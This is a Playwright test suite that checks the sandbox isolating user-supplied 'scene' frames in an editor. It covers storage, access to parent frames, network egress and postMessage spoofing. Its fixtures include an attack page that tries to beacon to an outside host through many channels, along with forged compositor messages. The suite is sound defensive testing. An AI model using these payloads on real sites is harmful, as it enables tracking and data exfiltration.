import { test } from "@playwright/test";
import { COMPOSITOR, EDITOR, OUTSIDE, SCENES } from "./hosts.ts";
import { expect, leaks, openLab, pageScene, type TestScene } from "./support.ts";

test.beforeEach(({ page }) => openLab(page));

const result = <T>(scene: TestScene) =>
  scene.read(() => (window as unknown as { result: T }).result);

test("the scene has no storage", async ({ page }) => {
  const scene = await pageScene(
    page,
    `<!doctype html><script type="module">
      const attempt = async (run) => {
        try {
          return "got: " + String(await run());
        } catch (error) {
          return "refused";
        }
      };
      window.result = {
        localStorage: await attempt(() => localStorage.setItem("a", "1")),
        sessionStorage: await attempt(() => sessionStorage.setItem("a", "1")),
        indexedDB: await attempt(() => new Promise((resolve, reject) => {
          const request = indexedDB.open("a");
          request.onsuccess = () => resolve("open");
          request.onerror = () => reject(request.error);
        })),
        caches: await attempt(() => caches.open("a")),
        cookie: await attempt(() => { document.cookie = "a=1"; return document.cookie; }),
        cookieStore: await attempt(() => cookieStore.set("a", "1")),
        directory: await attempt(() => navigator.storage.getDirectory()),
        estimate: await attempt(() => navigator.storage.estimate()),
        locks: await attempt(() => navigator.locks.request("a", () => "held")),
        serviceWorker: await attempt(() => navigator.serviceWorker.register("/sw.js")),
        storageAccess: await attempt(() => document.requestStorageAccess()),
      };
    </script>`,
  );
  const facts = await result<Record<string, string>>(scene);
  expect(Object.keys(facts)).toHaveLength(11);
  expect(Object.entries(facts).filter(([, value]) => value !== "refused")).toEqual([]);
});

test("the scene cannot touch the pages around it", async ({ page }) => {
  await pageScene(page, `<!doctype html><p>next door</p>`);
  const scene = await pageScene(
    page,
    `<!doctype html><script>
      const attempt = (run) => {
        try {
          return "got: " + String(run());
        } catch {
          return "refused";
        }
      };
      window.result = {
        parentDocument: attempt(() => parent.document),
        topDocument: attempt(() => top.document),
        parentLocation: attempt(() => parent.location.href),
        topLocation: attempt(() => top.location.href),
        parentGlobal: attempt(() => parent.lab),
        topGlobal: attempt(() => top.lab),
        frameElement: attempt(() => frameElement.src),
        siblings: attempt(() => parent.frames[0].document),
        opener: String(opener),
        referrer: document.referrer,
        origin: self.origin,
        boot: typeof aqBoot,
      };
    </script>`,
  );
  const { opener, referrer, origin, boot, ...attempts } =
    await result<Record<string, string>>(scene);
  expect(Object.entries(attempts).filter(([, value]) => value !== "refused")).toEqual([]);
  expect({ opener, referrer, origin, boot }).toEqual({
    opener: "null",
    referrer: "",
    origin: "null",
    boot: "undefined",
  });
  expect(await page.evaluate(() => window.location.href)).toBe(`${EDITOR}/`);
});

test.describe("the network", () => {
  /** Everything that goes out on its own. What counts is what arrives. */
  const ATTACK = (token: string) => `<!doctype html><style>
      @import url("${OUTSIDE}/${token}/css-import.css");
      @font-face { font-family: x; src: url("${OUTSIDE}/${token}/font") }
      body { background: url("${OUTSIDE}/${token}/css-background"); font-family: x }
    </style>
    <link rel="stylesheet" href="${OUTSIDE}/${token}/link.css">
    <link rel="preload" as="image" href="${OUTSIDE}/${token}/preload">
    <link rel="prefetch" href="${OUTSIDE}/${token}/prefetch">
    <body>a<img src="${OUTSIDE}/${token}/img">
    <img srcset="${OUTSIDE}/${token}/srcset 1x">
    <video src="${OUTSIDE}/${token}/video"></video>
    <audio src="${OUTSIDE}/${token}/audio"></audio>
    <object data="${OUTSIDE}/${token}/object"></object>
    <embed src="${OUTSIDE}/${token}/embed">
    <iframe src="${OUTSIDE}/${token}/iframe"></iframe>
    <script src="${OUTSIDE}/${token}/script.js"></script>
    <script type="module" src="${OUTSIDE}/${token}/module.js"></script>
    <script type="module">
      const out = (name) => "${OUTSIDE}/${token}/" + name;
      const attempt = async (run) => {
        try {
          return "got: " + String(await run());
        } catch {
          return "refused";
        }
      };
      const finished = (object) => new Promise((resolve) => {
        object.onerror = object.onload = object.onclose = () => resolve();
      });
      const image = new Image();
      image.src = out("js-image");
      const worker = new Worker(URL.createObjectURL(new Blob([
        'fetch("' + out("worker-fetch") + '").catch(() => {});',
        'try { importScripts("' + out("worker-import") + '") } catch {}',
        'postMessage("done")',
      ], { type: "text/javascript" })));
      window.result = {
        fetch: await attempt(() => fetch(out("fetch"))),
        fetchNoCors: await attempt(() => fetch(out("no-cors"), { mode: "no-cors" })),
        request: await attempt(() => fetch(new Request(out("request")))),
        xhr: await attempt(() => new Promise((resolve, reject) => {
          const request = new XMLHttpRequest();
          request.open("GET", out("xhr"));
          request.onload = () => resolve("loaded");
          request.onerror = () => reject(new Error("no"));
          request.send();
        })),
        webSocket: await attempt(() => new Promise((resolve, reject) => {
          const socket = new WebSocket(out("ws").replace("http", "ws"));
          socket.onopen = () => resolve("open");
          socket.onerror = () => reject(new Error("no"));
        })),
        eventSource: await attempt(() => new Promise((resolve, reject) => {
          const source = new EventSource(out("events"));
          source.onopen = () => resolve("open");
          source.onerror = () => reject(new Error("no"));
        })),
        import: await attempt(() => import(out("import.js"))),
      };
      navigator.sendBeacon?.(out("beacon"), "x");
      window.open(out("window-open"));
      const form = document.createElement("form");
      form.action = out("form");
      form.method = "post";
      document.body.append(form);
      form.submit();
      await new Promise((resolve) => (worker.onmessage = resolve));
      window.done = true;
    </script>`;

  test("is closed: nothing arrives", async ({ page }) => {
    const token = "attack";
    const scene = await pageScene(page, ATTACK(token));
    await scene.seek(5);
    await expect.poll(() => scene.read(() => (window as { done?: boolean }).done)).toBe(true);
    await page.waitForTimeout(300);
    const facts = await result<Record<string, string>>(scene);
    expect(Object.entries(facts).filter(([, value]) => value !== "refused")).toEqual([]);
    expect((await leaks()).filter((line) => line.includes(token))).toEqual([]);
  });

  test("would be open without the sandbox, so the test above means something", async ({ page }) => {
    await page.goto(`${OUTSIDE}/control/page`);
    await page.evaluate(async (outside) => {
      await fetch(`${outside}/control/fetch`);
      const image = new Image();
      image.src = `${outside}/control/img`;
      await image.decode().catch(() => {});
    }, OUTSIDE);
    const arrived = (await leaks()).filter((line) => line.includes("/control/"));
    expect(arrived).toEqual(
      expect.arrayContaining(["GET /control/page", "GET /control/fetch", "GET /control/img"]),
    );
  });

  test("says what it stopped, so that nobody has to guess", async ({ page }) => {
    const scene = await pageScene(
      page,
      `<!doctype html><script type="module">
        await fetch("${OUTSIDE}/said/fetch").catch(() => {});
        const image = new Image();
        image.src = "${OUTSIDE}/said/img";
        await image.decode().catch(() => {});
      </script>`,
    );
    await scene.seek(1);
    await expect
      .poll(async () => (await scene.problems()).filter(({ kind }) => kind === "blocked").length)
      .toBeGreaterThanOrEqual(2);
    const blocked = (await scene.problems()).filter(({ kind }) => kind === "blocked");
    expect(blocked.map(({ code, target }) => [code, target])).toEqual([
      ["connect-src", `${OUTSIDE}/said/fetch`],
      ["img-src", `${OUTSIDE}/said/img`],
    ]);
  });

  test("a scene cannot leave its page either", async ({ page }) => {
    const scene = await pageScene(
      page,
      `<!doctype html><script>
        window.leave = () => {
          location.href = "${OUTSIDE}/navigate";
        };
      </script>`,
    );
    await scene.read(() => (window as unknown as { leave: () => void }).leave());
    await page.waitForTimeout(500);
    expect((await leaks()).filter((line) => line.includes("/navigate"))).toEqual([]);
  });
});

test.describe("the page itself", () => {
  test("has its policy in the response, and nothing else on the site", async ({ request }) => {
    const [origin] = SCENES;
    const response = await request.get(`${origin}/scene.html`);
    expect(response.status()).toBe(200);
    const policy = response.headers()["content-security-policy"];
    expect(policy).toContain("default-src 'none'");
    expect(policy).toContain("sandbox allow-scripts");
    expect((await request.get(`${origin}/secret`)).status()).toBe(404);
    expect((await request.get(`${origin}/`)).status()).toBe(404);
  });

  test("has no origin even when opened directly", async ({ page }) => {
    await page.goto(`${SCENES[0]}/scene.html`);
    expect(await page.evaluate(() => self.origin)).toBe("null");
  });

  test("runs in a frame that is sandboxed as well", async ({ page }) => {
    const scene = await pageScene(page, `<!doctype html>`);
    const frame = await scene.frame();
    const element = await frame.frameElement();
    expect(await element.getAttribute("sandbox")).toBe("allow-scripts");
    expect(frame.url().startsWith(COMPOSITOR)).toBe(false);
  });
});

test.describe("messages", () => {
  const VICTIM = `<!doctype html><script>
    window.heard = [];
    addEventListener("message", ({ data }) => heard.push(data));
  </script>`;

  /** A scene that says something to every frame next to it, and to whoever is above it. */
  const shout = (code: string) => `<!doctype html><script>
    const shout = (message) => {
      for (let index = 0; index < parent.frames.length; index += 1) {
        parent.frames[index].postMessage(message, "*");
      }
    };
    window.attack = () => { ${code} };
  </script>`;

  const attack = (scene: TestScene) =>
    scene.read(() => (window as unknown as { attack: () => void }).attack());

  test("a scene does not take orders from the scene next to it", async ({ page }) => {
    const victim = await pageScene(page, VICTIM);
    const attacker = await pageScene(
      page,
      shout(`shout({ type: "seek", request: 999, frame: 300 });
        shout({ type: "play", base: { frame: 300, at: 0, rate: 1 } });
        shout({ type: "ping", nonce: 7 });`),
    );
    await attack(attacker);
    await page.waitForTimeout(200);
    expect(await victim.read(() => performance.now())).toBe(0);
    expect((await victim.info()).positions).toEqual([]);
    // The attack did reach it, and the project there can make of it what it wants.
    const heard = await victim.read(() => (window as unknown as { heard: unknown[] }).heard);
    expect(heard).toHaveLength(3);
  });

  test("the project never sees what the compositor says", async ({ page }) => {
    const scene = await pageScene(page, VICTIM);
    await scene.seek(10);
    await scene.call("channels", "layer", { a: 1 });
    expect(await scene.read(() => (window as unknown as { heard: unknown[] }).heard)).toEqual([]);
  });

  test("an empty page cannot be started by a neighbour", async ({ page }) => {
    const [, , , origin] = SCENES;
    const attacker = await pageScene(
      page,
      shout(`shout({
        type: "boot",
        runtime: 1,
        code: new Blob(["window.taken = true"], { type: "text/javascript" }),
        scene: {},
      });`),
    );
    await page.evaluate((target) => window.lab.call("bareFrame", target), origin);
    await attack(attacker);
    await page.waitForTimeout(200);
    const bare = page.frames().find((frame) => frame.url().startsWith(`${origin}/`));
    expect(await bare?.evaluate(() => (window as { taken?: boolean }).taken)).toBeUndefined();
  });

  test("the compositor knows who says what", async ({ page }) => {
    const victim = await pageScene(page, VICTIM);
    const attacker = await pageScene(
      page,
      `<!doctype html><script>
        window.attack = () => {
          parent.postMessage({
            type: "problem",
            problem: { kind: "error", message: "planted", frame: 0 },
          }, "*");
          parent.postMessage({ type: "failed", message: "planted" }, "*");
        };
      </script>`,
    );
    await attacker.read(() => (window as unknown as { attack: () => void }).attack());
    await page.waitForTimeout(200);
    const seen = await victim.info();
    expect(seen.problems).toEqual([]);
    expect(seen.failures).toEqual([]);
    expect(seen.state).toBe("ready");
    expect(await victim.seek(5)).toBe(true);
  });

  test("a scene cannot give orders to the compositor or the editor", async ({ page }) => {
    const victim = await pageScene(page, VICTIM);
    const attacker = await pageScene(
      page,
      `<!doctype html><script>
        window.attack = () => {
          const close = { call: 1000, method: "close", args: [1] };
          parent.postMessage(close, "*");
          top.postMessage(close, "*");
          top.postMessage({ reply: 1000, value: "planted" }, "*");
          top.postMessage({ hello: true }, "*");
        };
      </script>`,
    );
    await attacker.read(() => (window as unknown as { attack: () => void }).attack());
    await page.waitForTimeout(200);
    // It reached the editor, which knew who it came from, and the victim is still there.
    expect(await page.evaluate(() => window.lab.foreign())).toBe(3);
    expect((await attacker.info()).state).toBe("ready");
    expect(await victim.seek(5)).toBe(true);
  });

  test("a scene that talks nonsense changes nothing", async ({ page }) => {
    const scene = await pageScene(
      page,
      `<!doctype html><script>
        window.attack = () => {
          for (const message of [
            null,
            "seeked",
            42,
            [],
            {},
            { type: "seeked" },
            { type: "seeked", request: "1", frame: 1 },
            { type: "ready" },
            { type: "problem", problem: { kind: "anything", frame: 0 } },
            { type: "problem", problem: { kind: "error", frame: "0" } },
            { type: "hello", runtime: 1 },
          ]) {
            parent.postMessage(message, "*");
          }
        };
      </script>`,
    );
    await scene.read(() => (window as unknown as { attack: () => void }).attack());
    await page.waitForTimeout(100);
    const { state, problems } = await scene.info();
    expect(state).toBe("ready");
    expect(problems).toEqual([]);
    expect(await scene.seek(5)).toBe(true);
  });
});
